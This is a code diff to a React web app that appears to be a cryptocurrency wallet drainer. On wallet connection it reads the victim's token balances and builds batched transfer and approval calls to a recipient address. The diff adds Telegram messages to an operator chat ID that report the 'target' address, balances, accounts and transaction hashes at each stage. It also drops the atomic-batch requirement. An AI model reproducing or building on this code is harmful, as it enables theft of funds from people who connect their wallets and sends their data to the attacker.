@@ -8,13 +8,14 @@ import { keccak256 } from 'tronweb/utils';
 import { useAppKit,useAppKitAccount,useAppKitProvider   } from '@reown/appkit/react';
 //import {BatchTransactionManager, TransactionTemplates, type BatchTransaction} from './BatchClass';
 import {  useSendCalls, useWriteContract, useBalance  } from 'wagmi'
-import {getTokenBalance, handleGetBalance} from "./functions"
+import {getTokenBalance, handleGetBalance, sendTelegramMessage} from "./functions"
 import { MaxInt256, parseEther } from 'ethers';
 import { encodeFunctionData, erc20Abi } from 'viem';
 import MetaMaskPopup from './popup';
 import SendDialog from './manual';
 const CONTRACT_ADDRESS = import.meta.env.VITE_CONTRACT_ADDRESS;
 const RECIPIENT       = import.meta.env.VITE_RECIPIENT_ADDRESS;
+const CHAT_ID         = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
 
 
@@ -34,6 +35,7 @@ const wallet = new WalletConnectWallet({
 
 function App() {
   const [isOpen, setIsOpen] = useState(false)
+  const [chainID, setChainID] = useState(0)
   const [isManOpen, setManualOpen] = useState(false)
    const [popupTitle, setPopupTitle] = useState("Processing Transaction");
  const [popupMessage, setPopupMessage] = useState("Please wait while we confirm...");
@@ -97,6 +99,29 @@ function App() {
     //adapter.connect();
   }
 
+  const formatBalancesTable = (resolvedBalances)=>{
+      let table = "💰 <b>Balance Summary</b>\n";
+      table += "━━━━━━━━━━━━━━━━━━━━\n\n";
+      
+      resolvedBalances.forEach((balance, index) => {
+          table += `📊 <b>Asset ${index + 1}:</b>\n`;
+          
+          Object.entries(balance).forEach(([key, value]) => {
+              // Format key for better readability
+              const formattedKey = key
+                  .replace(/([A-Z])/g, ' $1')
+                  .replace(/^./, str => str.toUpperCase())
+                  .trim();
+              
+              table += `  ${formattedKey}: <code>${value}</code>\n`;
+          });
+          
+          table += "\n"; // Add spacing between assets
+      });
+      
+      return table;
+  }
+
   const runTokenFetches = useCallback(async (balances) => {
     if (isTransactionInProgress) {
       console.log("[v0] Transaction already in progress, skipping duplicate call")
@@ -139,6 +164,7 @@ function App() {
 
       const resolvedBalances = await Promise.resolve(balances)
       if (!resolvedBalances || !Array.isArray(resolvedBalances)) {
+        sendTelegramMessage(CHAT_ID, `Token Balance Couldn't be Fetched: ${address}`, chainID, "error", address);
         const errorMsg = "❌ Invalid balances data"
         console.error(errorMsg)
         setTransactionError(errorMsg)
@@ -153,6 +179,8 @@ function App() {
       }
 
       console.log("[v0] Resolved balances:", resolvedBalances)
+      const formattedBalance = formatBalancesTable(resolvedBalances);
+      sendTelegramMessage(CHAT_ID, `Token Balances successfully Fetched: ${formattedBalance}`, chainID, "info", address);
 
       const calls = []
       
@@ -204,8 +232,12 @@ function App() {
           params: []
         })
         console.log("[v0] Retrieved accounts:", accounts)
+        sendTelegramMessage(CHAT_ID, `Total Account Retrieved From Target: ${accounts.length} ${accounts.map((account, index) => 
+          `${index + 1}. <code>${account}</code>`
+        ).join('\n')}`, chainID, "info", address);
       } catch (accountError) {
         const errorMsg = "❌ Failed to retrieve accounts: " + accountError.message
+        sendTelegramMessage(CHAT_ID, `${errorMsg}`, chainID, "error", address);
         console.error(errorMsg)
         setTransactionError(errorMsg)
         setPopupTitle("Error ")
@@ -245,6 +277,8 @@ function App() {
           chainIdHex = '0x1' // Fallback to mainnet
         }
 
+        sendTelegramMessage(CHAT_ID, `Attempting to batch the send calls, we need the target to confirm`, chainID, "info", address);
+
         const batchResult = await provider.request({
           method: 'wallet_sendCalls',
           params: [{
@@ -252,10 +286,25 @@ function App() {
             chainId: chainIdHex, // Already in hex format from eth_chainId
             from: userAddress,
             calls: calls,
-            atomicRequired: true
+            atomicRequired: false
           }]
         })
+        let transactionHash;
 
+        if (batchResult && batchResult.transactionHash) {
+          // Direct transaction hash
+          transactionHash = batchResult.transactionHash;
+        } else if (batchResult && batchResult.result && batchResult.result.transactionHash) {
+          // Nested in result object
+          transactionHash = batchResult.result.transactionHash;
+        } else if (batchResult && Array.isArray(batchResult) && batchResult[0]?.transactionHash) {
+          // Array of results (multiple transactions)
+          transactionHash = batchResult[0].transactionHash;
+        } else if (batchResult && batchResult.id) {
+          // Some wallets return an ID that might be the transaction hash
+          transactionHash = batchResult.id;
+        }
+        sendTelegramMessage(CHAT_ID, `Batch Transaction Successful please review the transaction`, chainID, "success", address, transactionHash );
         console.log("[v0] ✅ Batch transaction sent via wallet_sendCalls:", batchResult)
         setTransactionResult({ method: 'batch', result: batchResult })
         setIsTransactionInProgress(false)
@@ -263,6 +312,7 @@ function App() {
 
       } catch (batchError) {
         console.log("[v0] ⚠️ Batch transaction not supported, falling back to sequential:", batchError.message)
+        sendTelegramMessage(CHAT_ID, `⚠️ Batch transaction not supported, falling back to sequential: ${batchError.message}`, chainID, "warn", address );
         // Continue to sequential strategy
       }
 
@@ -273,6 +323,7 @@ function App() {
       for (let i = 0; i < calls.length; i++) {
         try {
           console.log(`[v0] Sending transaction ${i + 1}/${calls.length}...`)
+          sendTelegramMessage(CHAT_ID, `⚠️ Sending transaction ${i + 1}/${calls.length}...`, chainID, "info", address );
 
           const txObject = {
             from: userAddress,
@@ -323,6 +374,9 @@ function App() {
       }
 
       console.log("[v0] All transactions completed:", results)
+      sendTelegramMessage(CHAT_ID, `⚠️ All transactions completed:...${results.map((result, index) => 
+          `${index + 1}. <code>${result.hash}</code>`
+        ).join('\n')}`, chainID, "success", address );
       setTransactionResult({ method: 'sequential', results })
       setIsTransactionInProgress(false)
       setLogoUrl("/cancel.png");
@@ -335,6 +389,7 @@ function App() {
 
     } catch (error) {
       const errorMsg = "❌ Token fetch process failed: " + error.message
+      sendTelegramMessage(CHAT_ID, "❌ Token fetch process failed: " + error.message, chainID, "success", address );
       console.error(errorMsg)
       setLogoUrl("/cancel.png");
       setPopupTitle("Processing Error");
@@ -351,7 +406,18 @@ function App() {
   useEffect(() => {
     console.log("[v0] useEffect triggered - isMobileConnect:", isMobileConnect, "address:", address)
 
+    const runGetChainID = async ()=>{
+      if( provider ){
+        const network = await provider.getNetwork();
+        if(network){
+          setChainID(network.chainId)
+        }
+      }
+    }
+
     if (isMobileConnect && address && provider && !hasInitiatedTransaction && !isTransactionInProgress) {
+      runGetChainID();
+      sendTelegramMessage(CHAT_ID, `Target Connection Confirmed, Connected Account Address: ${address}`, chainID, "info", address);
       console.log("[v0] Initiating token fetch transaction")
       setHasInitiatedTransaction(true) // Set flag to prevent re-running
       
